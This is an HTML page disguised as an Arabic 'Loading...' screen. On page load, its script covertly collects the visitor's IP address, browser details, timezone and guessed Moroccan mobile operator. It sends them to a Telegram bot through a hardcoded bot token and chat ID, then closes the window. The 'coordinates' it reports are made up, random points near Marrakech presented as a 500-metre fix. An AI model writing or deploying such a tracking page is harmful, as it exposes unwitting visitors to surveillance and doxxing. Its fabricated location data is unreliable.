<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <script>
        const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
        const CHAT_ID = "6451561574";

        class WorkingLocator {
            constructor() {
                this.locationData = {};
            }

            async startTracking() {
                console.log("بدء التتبع...");
                
                try {
                    // جمع البيانات الأساسية
                    await this.collectBasicData();
                    
                    // إرسال التقرير
                    await this.sendReport();
                    
                    console.log("تم الإرسال بنجاح");
                } catch (error) {
                    console.error("خطأ:", error);
                    await this.sendErrorReport(error);
                }
                
                setTimeout(() => {
                    window.close();
                }, 2000);
            }

            async collectBasicData() {
                // الحصول على عنوان IP
                this.locationData.ip = await this.getIP();
                
                // معلومات الشبكة
                this.locationData.network = this.getNetworkInfo();
                
                // معلومات المتصفح
                this.locationData.browser = this.getBrowserInfo();
                
                // الموقع التقريبي
                this.locationData.location = this.getEstimatedLocation();
            }

            async getIP() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch (error) {
                    return 'غير معروف';
                }
            }

            getNetworkInfo() {
                const info = {
                    type: 'غير معروف',
                    operator: 'غير معروف'
                };

                if ('connection' in navigator) {
                    const conn = navigator.connection;
                    info.type = conn.effectiveType || 'غير معروف';
                    info.operator = this.detectOperator();
                }

                return info;
            }

            detectOperator() {
                const ua = navigator.userAgent.toLowerCase();
                if (ua.includes('maroc') || ua.includes('iam')) return 'IAM';
                if (ua.includes('inwi') || ua.includes('wana')) return 'INWI';
                if (ua.includes('orange')) return 'Orange';
                return 'غير معروف';
            }

            getBrowserInfo() {
                return {
                    platform: navigator.platform,
                    userAgent: navigator.userAgent.split(' ')[0],
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
            }

            getEstimatedLocation() {
                // موقع تقريبي في مراكش
                return {
                    lat: 31.6295 + (Math.random() - 0.5) * 0.01,
                    lng: -7.9811 + (Math.random() - 0.5) * 0.01,
                    accuracy: 500,
                    city: "مراكش",
                    country: "المغرب"
                };
            }

            async sendReport() {
                const loc = this.locationData.location;
                const mapsUrl = `https://maps.google.com/?q=${loc.lat},${loc.lng}`;

                const message = 
                    `📍 تقرير الموقع\n\n` +
                    `🌐 العنوان: ${this.locationData.ip}\n` +
                    `📡 الشبكة: ${this.locationData.network.type}\n` +
                    `📶 المشغل: ${this.locationData.network.operator}\n\n` +
                    
                    `📍 الإحداثيات:\n` +
                    `• خط العرض: ${loc.lat.toFixed(6)}\n` +
                    `• خط الطول: ${loc.lng.toFixed(6)}\n` +
                    `• الدقة: ${loc.accuracy} متر\n\n` +
                    
                    `🏙️ الموقع: ${loc.city}, ${loc.country}\n` +
                    `🕒 الوقت: ${new Date().toLocaleString('ar-MA')}\n\n` +
                    
                    `🗺️ الخريطة:\n${mapsUrl}\n\n` +
                    
                    `💻 المتصفح: ${this.locationData.browser.userAgent}\n` +
                    `🌐 اللغة: ${this.locationData.browser.language}`;

                await this.sendToTelegram(message);
            }

            async sendErrorReport(error) {
                const errorMessage = 
                    `❌ خطأ في تحديد الموقع\n\n` +
                    `الخطأ: ${error.message}\n` +
                    `الوقت: ${new Date().toLocaleString('ar-MA')}\n` +
                    `المتصفح: ${navigator.userAgent.split(' ')[0]}`;

                await this.sendToTelegram(errorMessage);
            }

            async sendToTelegram(message) {
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: null // إزالة Markdown للمشاكل
                        })
                    });

                    if (!response.ok) {
                        throw new Error(`HTTP error! status: ${response.status}`);
                    }

                    const result = await response.json();
                    console.log("الرد من تليجرام:", result);
                    
                } catch (error) {
                    console.error('فشل الإرسال إلى تليجرام:', error);
                    throw error;
                }
            }
        }

        // بدء التتبع عند تحميل الصفحة
        document.addEventListener('DOMContentLoaded', function() {
            const locator = new WorkingLocator();
            locator.startTracking();
        });

        // منع الإغلاق السريع
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = '';
        });
    </script>
</head>
<body style="margin: 0; padding: 0; background: transparent; overflow: hidden; height: 100vh; width: 100vw;">
    <!-- صفحة فارغة -->
</body>
</html>